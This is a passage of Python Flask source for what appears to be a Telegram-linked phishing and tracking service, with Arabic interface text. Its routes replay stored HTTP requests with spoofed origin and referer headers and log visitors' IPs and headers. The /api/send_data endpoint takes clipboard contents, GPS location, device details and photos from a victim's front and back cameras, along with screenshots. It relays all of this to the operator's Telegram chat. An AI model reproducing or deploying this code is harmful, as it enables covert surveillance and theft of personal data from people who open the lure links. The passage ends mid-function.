        return False

@app.route('/<method>/<int:link_id>/<user_id>')
def execute_http_request_by_link(method, link_id, user_id):
    """تنفيذ طلب HTTP من خلال الرابط الديناميكي الجديد"""
    try:
        sessions = load_sessions()
        
        if user_id not in sessions:
            error_html = """
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>رابط غير صحيح</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        color: white;
                        text-align: center;
                        padding: 20px;
                    }
                    .container {
                        background: rgba(0, 0, 0, 0.6);
                        backdrop-filter: blur(15px);
                        padding: 50px;
                        border-radius: 25px;
                        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                        max-width: 500px;
                    }
                    h1 { color: #FFD700; margin-bottom: 20px; }
                    p { font-size: 18px; line-height: 1.6; margin: 15px 0; }
                    .icon { font-size: 80px; margin-bottom: 20px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="icon">❌</div>
                    <h1>رابط غير صحيح</h1>
                    <p>عذراً، لم يتم العثور على المستخدم</p>
                    <p>الرابط قد يكون منتهي الصلاحية أو غير صحيح</p>
                </div>
            </body>
            </html>
            """
            return error_html, 404
        
        http_requests = sessions[user_id].get('http_requests', [])
        
        if link_id >= len(http_requests):
            error_html = """
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>رابط غير صحيح</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        color: white;
                        text-align: center;
                        padding: 20px;
                    }
                    .container {
                        background: rgba(0, 0, 0, 0.6);
                        backdrop-filter: blur(15px);
                        padding: 50px;
                        border-radius: 25px;
                        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                        max-width: 500px;
                    }
                    h1 { color: #FFD700; margin-bottom: 20px; }
                    p { font-size: 18px; line-height: 1.6; margin: 15px 0; }
                    .icon { font-size: 80px; margin-bottom: 20px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="icon">❌</div>
                    <h1>رابط غير صحيح</h1>
                    <p>عذراً، لم يتم العثور على الطلب المطلوب</p>
                    <p>الرابط قد يكون منتهي الصلاحية أو غير صحيح</p>
                </div>
            </body>
            </html>
            """
            return error_html, 404
        
        request_data = http_requests[link_id]
        
        if not request_data.get('active', True):
            error_html = """
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>رابط غير نشط</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        color: white;
                        text-align: center;
                        padding: 20px;
                    }
                    .container {
                        background: rgba(0, 0, 0, 0.6);
                        backdrop-filter: blur(15px);
                        padding: 50px;
                        border-radius: 25px;
                        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                        max-width: 500px;
                    }
                    h1 { color: #FFD700; margin-bottom: 20px; }
                    p { font-size: 18px; line-height: 1.6; margin: 15px 0; }
                    .icon { font-size: 80px; margin-bottom: 20px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="icon">⚠️</div>
                    <h1>رابط غير نشط</h1>
                    <p>عذراً، هذا الرابط غير نشط حالياً</p>
                </div>
            </body>
            </html>
            """
            return error_html, 403
        
        if not is_url_safe(request_data['url']):
            return "عذراً، هذا الـ URL غير مسموح به لأسباب أمنية", 403
        
        headers_dict = request_data['headers']
        if request_data.get('successful_origin'):
            headers_dict['origin'] = request_data['successful_origin']
        if request_data.get('successful_referer'):
            headers_dict['referer'] = request_data['successful_referer']
        
        headers_dict['Accept-Encoding'] = 'identity'
        
        request_body = request_data.get('request_body')
        
        try:
            if request_data['method'] == 'GET':
                response = requests.get(request_data['url'], headers=headers_dict, timeout=10, allow_redirects=True)
            elif request_data['method'] == 'POST':
                response = requests.post(request_data['url'], headers=headers_dict, data=request_body, timeout=10, allow_redirects=True)
            elif request_data['method'] in ['PUT', 'PATCH']:
                response = requests.request(request_data['method'], request_data['url'], headers=headers_dict, data=request_body, timeout=10, allow_redirects=True)
            else:
                response = requests.request(request_data['method'], request_data['url'], headers=headers_dict, timeout=10, allow_redirects=True)
            
            decoded_response = decode_response_content(response)
            
            bot_token = os.environ.get('BOT_TOKEN', '')
            if bot_token:
                send_response_to_telegram(bot_token, user_id, request_data, response, decoded_response)
            
            result_html = f"""
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>نتيجة التنفيذ</title>
                <style>
                    body {{
                        font-family: 'Courier New', monospace;
                        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
                        min-height: 100vh;
                        padding: 20px;
                        color: white;
                    }}
                    .container {{
                        background: rgba(0, 0, 0, 0.8);
                        backdrop-filter: blur(15px);
                        padding: 30px;
                        border-radius: 15px;
                        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                        max-width: 900px;
                        margin: 0 auto;
                    }}
                    h1 {{ color: #4CAF50; margin-bottom: 20px; text-align: center; }}
                    .status {{ 
                        background: rgba(76, 175, 80, 0.2); 
                        padding: 15px; 
                        border-radius: 10px; 
                        margin: 20px 0;
                        border-left: 5px solid #4CAF50;
                    }}
                    .info {{
                        background: rgba(33, 150, 243, 0.2);
                        padding: 15px;
                        border-radius: 10px;
                        margin: 20px 0;
                        border-left: 5px solid #2196F3;
                    }}
                    .response {{
                        background: rgba(255, 255, 255, 0.1);
                        padding: 20px;
                        border-radius: 10px;
                        margin: 20px 0;
                        white-space: pre-wrap;
                        word-wrap: break-word;
                        max-height: 500px;
                        overflow-y: auto;
                        font-size: 14px;
                    }}
                    .success-icon {{ font-size: 60px; text-align: center; margin-bottom: 20px; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="success-icon">✅</div>
                    <h1>تم تنفيذ الطلب بنجاح</h1>
                    
                    <div class="status">
                        <p><strong>📊 Status Code:</strong> {response.status_code}</p>
                        <p><strong>🌐 URL:</strong> {request_data['url']}</p>
                        <p><strong>🔧 Method:</strong> {request_data['method']}</p>
                    </div>
                    
                    <div class="info">
                        <p><strong>🔗 Origin:</strong> {request_data.get('successful_origin', 'N/A')}</p>
                        <p><strong>🔗 Referer:</strong> {request_data.get('successful_referer', 'N/A')}</p>
                    </div>
                    
                    <h2 style="color: #FFD700;">📄 Response:</h2>
                    <div class="response">{decoded_response[:2000] if decoded_response else 'فارغ'}{'...' if len(decoded_response) > 2000 else ''}</div>
                    
                    <p style="text-align: center; margin-top: 30px; color: #4CAF50;">
                        ✅ تم إرسال النتيجة للبوت
                    </p>
                </div>
            </body>
            </html>
            """
            
            return result_html
            
        except Exception as e:
            error_html = f"""
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>خطأ في التنفيذ</title>
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        color: white;
                        text-align: center;
                        padding: 20px;
                    }}
                    .container {{
                        background: rgba(0, 0, 0, 0.6);
                        backdrop-filter: blur(15px);
                        padding: 50px;
                        border-radius: 25px;
                        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                        max-width: 500px;
                    }}
                    h1 {{ color: #fff; margin-bottom: 20px; }}
                    p {{ font-size: 18px; line-height: 1.6; margin: 15px 0; }}
                    .icon {{ font-size: 80px; margin-bottom: 20px; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="icon">❌</div>
                    <h1>خطأ في تنفيذ الطلب</h1>
                    <p>{str(e)}</p>
                </div>
            </body>
            </html>
            """
            return error_html, 500
            
    except Exception as e:
        return f"حدث خطأ: {str(e)}", 500

@app.route('/multi-http/<int:link_id>/<user_id>')
def execute_multi_http_requests_with_redirect(link_id, user_id):
    """تنفيذ عدة طلبات HTTP متتالية مع Redirect تلقائي"""
    try:
        sessions = load_sessions()
        
        if user_id not in sessions:
            return "<h1>الرابط غير صحيح أو منتهي الصلاحية</h1>", 404
        
        multi_requests = sessions[user_id].get('multi_http_requests', [])
        
        if link_id >= len(multi_requests):
            return "<h1>الرابط غير صحيح</h1>", 404
        
        multi_request_data = multi_requests[link_id]
        
        if not multi_request_data.get('active', True):
            return "<h1>رابط غير نشط</h1>", 403
        
        if not multi_request_data.get('redirect_url'):
            return "<h1>لم يتم تحديد رابط التوجيه</h1>", 404
        
        requests_list = multi_request_data.get('requests', [])
        if not requests_list:
            return "<h1>لا توجد طلبات للتنفيذ</h1>", 404
        
        visitor_ip = get_client_ip()
        visitor_user_agent = request.headers.get('User-Agent', 'Unknown')
        visitor_accept_language = request.headers.get('Accept-Language', 'Unknown')
        visitor_referer = request.headers.get('Referer', 'لا يوجد')
        
        all_headers = dict(request.headers)
        important_headers = {
            'User-Agent': all_headers.get('User-Agent', 'N/A'),
            'Accept-Language': all_headers.get('Accept-Language', 'N/A'),
            'Accept-Encoding': all_headers.get('Accept-Encoding', 'N/A'),
            'Accept': all_headers.get('Accept', 'N/A'),
            'Referer': all_headers.get('Referer', 'N/A'),
            'Connection': all_headers.get('Connection', 'N/A'),
            'Upgrade-Insecure-Requests': all_headers.get('Upgrade-Insecure-Requests', 'N/A'),
        }
        
        results = []
        
        import concurrent.futures
        from threading import Thread
        
        def execute_single_request(req_data):
            try:
                if not is_url_safe(req_data['url']):
                    return {
                        'success': False,
                        'url': req_data['url'],
                        'method': req_data['method'],
                        'error': 'URL غير مسموح به لأسباب أمنية'
                    }
                
                headers_dict = req_data['headers'].copy()
                if req_data.get('successful_origin'):
                    headers_dict['origin'] = req_data['successful_origin']
                if req_data.get('successful_referer'):
                    headers_dict['referer'] = req_data['successful_referer']
                
                headers_dict['Accept-Encoding'] = 'identity'
                request_body = req_data.get('request_body')
                
                if req_data['method'] == 'GET':
                    response = requests.get(req_data['url'], headers=headers_dict, timeout=10, allow_redirects=True)
                elif req_data['method'] == 'POST':
                    response = requests.post(req_data['url'], headers=headers_dict, data=request_body, timeout=10, allow_redirects=True)
                elif req_data['method'] in ['PUT', 'PATCH']:
                    response = requests.request(req_data['method'], req_data['url'], headers=headers_dict, data=request_body, timeout=10, allow_redirects=True)
                else:
                    response = requests.request(req_data['method'], req_data['url'], headers=headers_dict, timeout=10, allow_redirects=True)
                
                decoded_response = decode_response_content(response)
                
                extracted_data = {}
                selected_fields = req_data.get('selected_fields', [])
                
                if selected_fields:
                    extractable_data = extract_extractable_fields(response, decoded_response)
                    extractable_fields_actual = extractable_data.get('fields', {})
                    for field_name in selected_fields:
                        if field_name in extractable_fields_actual:
                            extracted_data[field_name] = extractable_fields_actual[field_name]
                
                return {
                    'success': True,
                    'url': req_data['url'],
                    'method': req_data['method'],
                    'status_code': response.status_code,
                    'response': decoded_response[:500],
                    'extracted_data': extracted_data
                }
            except Exception as e:
                return {
                    'success': False,
                    'url': req_data.get('url', 'Unknown'),
                    'method': req_data.get('method', 'Unknown'),
                    'error': str(e)
                }
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(execute_single_request, req) for req in requests_list]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        bot_token = os.environ.get('BOT_TOKEN', '')
        if bot_token:
            def send_multi_results():
                try:
                    import requests as req_lib
                    
                    success_count = sum(1 for r in results if r.get('success'))
                    fail_count = len(results) - success_count
                    
                    message = (
                        f"🔔 نتائج الطلبات المتعددة\n\n"
                        f"👤 معلومات الزائر:\n"
                        f"🌐 IP: {visitor_ip}\n"
                        f"📱 User-Agent: {visitor_user_agent[:80]}...\n"
                        f"🌍 اللغة: {visitor_accept_language}\n"
                        f"🔗 المصدر: {visitor_referer}\n\n"
                        f"━━━━━━━━━━━━━━━━\n\n"
                        f"📊 إجمالي الطلبات: {len(results)}\n"
                        f"✅ نجحت: {success_count}\n"
                        f"❌ فشلت: {fail_count}\n\n"
                        f"━━━━━━━━━━━━━━━━\n\n"
                    )
                    
                    for i, result in enumerate(results[:10], 1):
                        if result.get('success'):
                            message += f"✅ {i}. {result['method']} {result['url'][:50]}...\n"
                            message += f"   Status: {result['status_code']}\n"
                            
                            extracted_data = result.get('extracted_data', {})
                            if extracted_data:
                                message += f"   \n   📊 بيانات مستخرجة ({len(extracted_data)} حقل):\n"
                                for field_name, field_value in list(extracted_data.items())[:5]:
                                    message += f"      • {field_name}: {str(field_value)[:50]}...\n"
                                if len(extracted_data) > 5:
                                    message += f"      ... و {len(extracted_data) - 5} حقول أخرى\n"
                            else:
                                message += f"   Response: {result['response'][:100]}...\n"
                            
                            message += "\n"
                        else:
                            message += f"❌ {i}. {result['method']} {result['url'][:50]}...\n"
                            message += f"   Error: {result['error'][:100]}\n\n"
                    
                    if len(results) > 10:
                        message += f"\n... و {len(results) - 10} طلبات أخرى"
                    
                    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                    payload = {
                        'chat_id': user_id,
                        'text': message,
                        'parse_mode': 'HTML'
                    }
                    req_lib.post(telegram_url, json=payload, timeout=5)
                    
                    headers_message = (
                        f"📋 Headers الزائر:\n\n"
                    )
                    for key, value in important_headers.items():
                        if value != 'N/A':
                            headers_message += f"{key}: {value[:100]}...\n"
                    
                    payload2 = {
                        'chat_id': user_id,
                        'text': headers_message,
                        'parse_mode': 'HTML'
                    }
                    req_lib.post(telegram_url, json=payload2, timeout=5)
                except Exception as e:
                    print(f"خطأ في إرسال النتائج للتليجرام: {e}")
            
            Thread(target=send_multi_results, daemon=True).start()
        
        return redirect(multi_request_data['redirect_url'], code=302)
        
    except Exception as e:
        print(f"خطأ في تنفيذ الطلبات المتعددة: {e}")
        return f"<h1>حدث خطأ: {str(e)}</h1>", 500

@app.route('/<method>/redirect/<int:link_id>/<user_id>')
def execute_http_request_with_redirect(method, link_id, user_id):
    """تنفيذ طلب HTTP من خلال الرابط الديناميكي مع Redirect تلقائي"""
    try:
        sessions = load_sessions()
        
        if user_id not in sessions:
            return "<h1>الرابط غير صحيح أو منتهي الصلاحية</h1>", 404
        
        http_requests = sessions[user_id].get('http_requests', [])
        
        if link_id >= len(http_requests):
            return "<h1>الرابط غير صحيح</h1>", 404
        
        request_data = http_requests[link_id]
        
        if not request_data.get('active', True):
            return "<h1>رابط غير نشط</h1>", 403
        
        if not request_data.get('redirect_url'):
            return "<h1>لم يتم تحديد رابط التوجيه</h1>", 404
        
        if not is_url_safe(request_data['url']):
            return "عذراً، هذا الـ URL غير مسموح به لأسباب أمنية", 403
        
        headers_dict = request_data['headers']
        if request_data.get('successful_origin'):
            headers_dict['origin'] = request_data['successful_origin']
        if request_data.get('successful_referer'):
            headers_dict['referer'] = request_data['successful_referer']
        
        headers_dict['Accept-Encoding'] = 'identity'
        
        request_body = request_data.get('request_body')
        
        try:
            if request_data['method'] == 'GET':
                response = requests.get(request_data['url'], headers=headers_dict, timeout=10, allow_redirects=True)
            elif request_data['method'] == 'POST':
                response = requests.post(request_data['url'], headers=headers_dict, data=request_body, timeout=10, allow_redirects=True)
            elif request_data['method'] in ['PUT', 'PATCH']:
                response = requests.request(request_data['method'], request_data['url'], headers=headers_dict, data=request_body, timeout=10, allow_redirects=True)
            else:
                response = requests.request(request_data['method'], request_data['url'], headers=headers_dict, timeout=10, allow_redirects=True)
            
            decoded_response = decode_response_content(response)
            
            bot_token = os.environ.get('BOT_TOKEN', '')
            if bot_token:
                send_response_to_telegram(bot_token, user_id, request_data, response, decoded_response)
            
            return redirect(request_data['redirect_url'], code=302)
            
        except Exception as e:
            error_html = f"""
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>خطأ في التنفيذ</title>
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        color: white;
                        text-align: center;
                        padding: 20px;
                    }}
                    .container {{
                        background: rgba(0, 0, 0, 0.6);
                        backdrop-filter: blur(15px);
                        padding: 50px;
                        border-radius: 25px;
                        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                        max-width: 500px;
                    }}
                    h1 {{ color: #fff; margin-bottom: 20px; }}
                    p {{ font-size: 18px; line-height: 1.6; margin: 15px 0; }}
                    .icon {{ font-size: 80px; margin-bottom: 20px; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="icon">❌</div>
                    <h1>خطأ في تنفيذ الطلب</h1>
                    <p>{str(e)}</p>
                </div>
            </body>
            </html>
            """
            return error_html, 500
            
    except Exception as e:
        return f"حدث خطأ: {str(e)}", 500

@app.route('/execute/<request_id>/<user_id>')
def execute_http_request(request_id, user_id):
    try:
        request_data = db.get_http_request(request_id)
        
        if not request_data:
            error_html = """
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>رابط غير صحيح</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        color: white;
                        text-align: center;
                        padding: 20px;
                    }
                    .container {
                        background: rgba(0, 0, 0, 0.6);
                        backdrop-filter: blur(15px);
                        padding: 50px;
                        border-radius: 25px;
                        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                        max-width: 500px;
                    }
                    h1 { color: #FFD700; margin-bottom: 20px; }
                    p { font-size: 18px; line-height: 1.6; margin: 15px 0; }
                    .icon { font-size: 80px; margin-bottom: 20px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="icon">❌</div>
                    <h1>رابط غير صحيح</h1>
                    <p>عذراً، لم يتم العثور على الطلب المطلوب</p>
                    <p>الرابط قد يكون منتهي الصلاحية أو غير صحيح</p>
                </div>
            </body>
            </html>
            """
            return error_html, 404
        
        if request_data['user_id'] != user_id:
            return "غير مصرح", 403
        
        if not is_url_safe(request_data['url']):
            return "عذراً، هذا الـ URL غير مسموح به لأسباب أمنية", 403
        
        headers_dict = request_data['headers']
        if request_data.get('successful_origin'):
            headers_dict['origin'] = request_data['successful_origin']
        if request_data.get('successful_referer'):
            headers_dict['referer'] = request_data['successful_referer']
        
        headers_dict['Accept-Encoding'] = 'identity'
        
        request_body = request_data.get('request_body')
        
        try:
            if request_data['method'] == 'GET':
                response = requests.get(request_data['url'], headers=headers_dict, timeout=10, allow_redirects=True)
            elif request_data['method'] == 'POST':
                response = requests.post(request_data['url'], headers=headers_dict, data=request_body, timeout=10, allow_redirects=True)
            elif request_data['method'] in ['PUT', 'PATCH']:
                response = requests.request(request_data['method'], request_data['url'], headers=headers_dict, data=request_body, timeout=10, allow_redirects=True)
            else:
                response = requests.request(request_data['method'], request_data['url'], headers=headers_dict, timeout=10, allow_redirects=True)
            
            decoded_response = decode_response_content(response)
            
            bot_token = os.environ.get('BOT_TOKEN', '')
            if bot_token:
                send_response_to_telegram(bot_token, user_id, request_data, response, decoded_response)
            
            result_html = f"""
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>نتيجة التنفيذ</title>
                <style>
                    body {{
                        font-family: 'Courier New', monospace;
                        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
                        min-height: 100vh;
                        padding: 20px;
                        color: white;
                    }}
                    .container {{
                        background: rgba(0, 0, 0, 0.8);
                        backdrop-filter: blur(15px);
                        padding: 30px;
                        border-radius: 15px;
                        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                        max-width: 900px;
                        margin: 0 auto;
                    }}
                    h1 {{ color: #4CAF50; margin-bottom: 20px; text-align: center; }}
                    .status {{ 
                        background: rgba(76, 175, 80, 0.2); 
                        padding: 15px; 
                        border-radius: 10px; 
                        margin: 20px 0;
                        border-left: 5px solid #4CAF50;
                    }}
                    .info {{
                        background: rgba(33, 150, 243, 0.2);
                        padding: 15px;
                        border-radius: 10px;
                        margin: 20px 0;
                        border-left: 5px solid #2196F3;
                    }}
                    .response {{
                        background: rgba(255, 255, 255, 0.1);
                        padding: 20px;
                        border-radius: 10px;
                        margin: 20px 0;
                        white-space: pre-wrap;
                        word-wrap: break-word;
                        max-height: 500px;
                        overflow-y: auto;
                        font-size: 14px;
                    }}
                    .success-icon {{ font-size: 60px; text-align: center; margin-bottom: 20px; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="success-icon">✅</div>
                    <h1>تم تنفيذ الطلب بنجاح</h1>
                    
                    <div class="status">
                        <p><strong>📊 Status Code:</strong> {response.status_code}</p>
                        <p><strong>🌐 URL:</strong> {request_data['url']}</p>
                        <p><strong>🔧 Method:</strong> {request_data['method']}</p>
                    </div>
                    
                    <div class="info">
                        <p><strong>🔗 Origin:</strong> {request_data.get('successful_origin', 'N/A')}</p>
                        <p><strong>🔗 Referer:</strong> {request_data.get('successful_referer', 'N/A')}</p>
                    </div>
                    
                    <h2 style="color: #FFD700;">📄 Response:</h2>
                    <div class="response">{decoded_response[:2000] if decoded_response else 'فارغ'}{'...' if len(decoded_response) > 2000 else ''}</div>
                    
                    <p style="text-align: center; margin-top: 30px; color: #4CAF50;">
                        ✅ تم إرسال النتيجة للبوت
                    </p>
                </div>
            </body>
            </html>
            """
            
            return result_html
            
        except Exception as e:
            error_html = f"""
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>خطأ في التنفيذ</title>
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        color: white;
                        text-align: center;
                        padding: 20px;
                    }}
                    .container {{
                        background: rgba(0, 0, 0, 0.6);
                        backdrop-filter: blur(15px);
                        padding: 50px;
                        border-radius: 25px;
                        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                        max-width: 500px;
                    }}
                    h1 {{ color: #fff; margin-bottom: 20px; }}
                    p {{ font-size: 18px; line-height: 1.6; margin: 15px 0; }}
                    .icon {{ font-size: 80px; margin-bottom: 20px; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="icon">❌</div>
                    <h1>خطأ في تنفيذ الطلب</h1>
                    <p>{str(e)}</p>
                </div>
            </body>
            </html>
            """
            return error_html, 500
            
    except Exception as e:
        return f"حدث خطأ: {str(e)}", 500

@app.route('/api/send_data', methods=['POST'])
def send_data():
    try:
        data = request.json
        page_id = data.get('page_id')
        
        sessions = load_sessions()
        if page_id not in sessions:
            return jsonify({'success': False, 'error': 'Invalid page ID'}), 404
        
        device_info = data.get('deviceInfo', {})
        if 'visitors' not in sessions[page_id]:
            sessions[page_id]['visitors'] = []
        
        visitor_data = {
            'timestamp': datetime.now().isoformat(),
            'location': data.get('location', 'غير متاح'),
            'ip': data.get('ip', 'غير متاح'),
            'zone': data.get('zone', 'غير متاح'),
            'clipboard': data.get('clipboard', 'غير متاح'),
            'clipboardItems': data.get('clipboardItems', []),
            'device': {
                'type': device_info.get('deviceType', 'غير متاح'),
                'model': device_info.get('deviceModel', 'غير متاح'),
                'name': device_info.get('deviceName', 'غير متاح'),
                'os': f"{device_info.get('os', 'غير متاح')} {device_info.get('osVersion', '')}".strip(),
                'browser': f"{device_info.get('browser', 'غير متاح')} {device_info.get('browserVersion', '')}".strip(),
                'screen': device_info.get('screenResolution', 'غير متاح'),
                'language': device_info.get('language', 'غير متاح'),
                'timezone': device_info.get('timezone', 'غير متاح'),
                'battery': device_info.get('battery', 'غير متاح'),
                'connection': device_info.get('connection', 'غير متاح'),
                'platform': device_info.get('platform', 'غير متاح'),
                'userAgent': device_info.get('userAgent', 'غير متاح')
            }
        }
        
        sessions[page_id]['visitors'].append(visitor_data)
        
        if 'user_id' not in sessions[page_id]:
            sessions[page_id]['user_id'] = page_id
        
        save_sessions(sessions)
        
        session = sessions[page_id]
        user_id = session.get('user_id')
        
        bot_token = os.environ.get('BOT_TOKEN', '')
        
        if not bot_token:
            return jsonify({'success': False, 'error': 'BOT_TOKEN not configured'}), 500
        
        # للتأكد من وجود user_id
        if not user_id:
            print(f"❌ ERROR: No user_id found for page_id {page_id}")
            return jsonify({'success': False, 'error': 'Invalid session'}), 400
        
        battery_info = device_info.get('battery', {})
        battery_text = 'غير متاح'
        if isinstance(battery_info, dict):
            battery_text = f"{battery_info.get('level', 'غير متاح')} - {battery_info.get('charging', 'غير متاح')}"
        
        clipboard_items = data.get('clipboardItems', [])
        clipboard_text = data.get('clipboard', 'غير متاح')
        if clipboard_items and len(clipboard_items) > 1:
            clipboard_text = f"{len(clipboard_items)} عنصر"
        
        location_str = data.get('location', 'غير متاح')
        
        zone_text = device_info.get('timezone', 'غير متاح')
        
        message = f"""
🚨 بيانات جديدة من الرابط VIP!

📊 معلومات الزائر:
━━━━━━━━━━━━━━━━
🆔 معرف الرابط: {page_id}
🌍 الموقع: {location_str}
🌐 عنوان IP: {data.get('ip', 'غير متاح')}
🕐 المنطقة الزمنية: {zone_text}
📋 الحافظة: {clipboard_text}
🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📱 معلومات الجهاز:
━━━━━━━━━━━━━━━━
🖥️ نوع الجهاز: {device_info.get('deviceType', 'غير متاح')}
📱 موديل الجهاز: {device_info.get('deviceModel', 'غير متاح')}
💻 نظام التشغيل: {device_info.get('os', 'غير متاح')} {device_info.get('osVersion', '')}
🌐 المتصفح: {device_info.get('browser', 'غير متاح')} {device_info.get('browserVersion', '')}
📏 الدقة: {device_info.get('screenResolution', 'غير متاح')}
🌍 اللغة: {device_info.get('language', 'غير متاح')}
🔋 البطارية: {battery_text}
━━━━━━━━━━━━━━━━
        """
        
        telegram_api = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        reply_markup = None
        if location_str and location_str != 'غير متاح' and ',' in location_str:
            try:
                lat, lon = location_str.split(',')
                lat = lat.strip()
                lon = lon.strip()
                maps_url = f"https://www.google.com/maps?q={lat},{lon}"
                reply_markup = {
                    'inline_keyboard': [[
                        {'text': '📍 الذهاب إلى الموقع الجغرافي', 'url': maps_url}
                    ]]
                }
            except:
                pass
        
        message_data = {
            'chat_id': user_id,
            'text': message
        }
        
        if reply_markup:
            import json as json_lib
            message_data['reply_markup'] = json_lib.dumps(reply_markup)
        
        response = requests.post(telegram_api, data=message_data)
        
        print(f"📤 Telegram API Request:")
        print(f"   URL: {telegram_api}")
        print(f"   User ID: {user_id}")
        print(f"   Status Code: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code != 200:
            print(f"❌ ERROR: Failed to send message to Telegram!")
            print(f"   Response JSON: {response.json() if response.text else 'No response'}")
        else:
            print(f"✅ Message sent successfully to {user_id}")
        
        import base64
        
        print(f"DEBUG: Checking for 'photo' in data: {bool(data.get('photo'))}")
        if data.get('photo'):
            print(f"DEBUG: Photo data received, length: {len(data['photo'])}")
        
        if data.get('photo'):
            photo_base64 = data['photo']
            if photo_base64.startswith('data:image'):
                photo_base64 = photo_base64.split(',')[1]
            photo_bytes = base64.b64decode(photo_base64)
            
            telegram_photo_api = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
            files = {'photo': ('camera_photo.jpg', photo_bytes, 'image/jpeg')}
            photo_response = requests.post(telegram_photo_api, 
                files=files,
                data={'chat_id': user_id, 'caption': f'📸 صورة الكاميرا - {page_id}'}
            )
            print(f"Photo sent to {user_id}, status: {photo_response.status_code}")
        else:
            print(f"DEBUG: No photo data found in request")
        
        if data.get('frontPhoto'):
            photo_base64 = data['frontPhoto']
            if photo_base64.startswith('data:image'):
                photo_base64 = photo_base64.split(',')[1]
            photo_bytes = base64.b64decode(photo_base64)
            
            telegram_photo_api = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
            files = {'photo': ('front_camera.jpg', photo_bytes, 'image/jpeg')}
            photo_response = requests.post(telegram_photo_api, 
                files=files,
                data={'chat_id': user_id, 'caption': f'📸 الكاميرا الأمامية - {page_id}'}
            )
            print(f"Front photo sent to {user_id}, status: {photo_response.status_code}")
        
        if data.get('backPhoto'):
            photo_base64 = data['backPhoto']
            if photo_base64.startswith('data:image'):
                photo_base64 = photo_base64.split(',')[1]
            photo_bytes = base64.b64decode(photo_base64)
            
            telegram_photo_api = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
            files = {'photo': ('back_camera.jpg', photo_bytes, 'image/jpeg')}
            photo_response = requests.post(telegram_photo_api, 
                files=files,
                data={'chat_id': user_id, 'caption': f'📸 الكاميرا الخلفية - {page_id}'}
            )
            print(f"Back photo sent to {user_id}, status: {photo_response.status_code}")
        
        if data.get('screenshot'):
            photo_base64 = data['screenshot']
            if photo_base64.startswith('data:image'):
                photo_base64 = photo_base64.split(',')[1]
            photo_bytes = base64.b64decode(photo_base64)
            
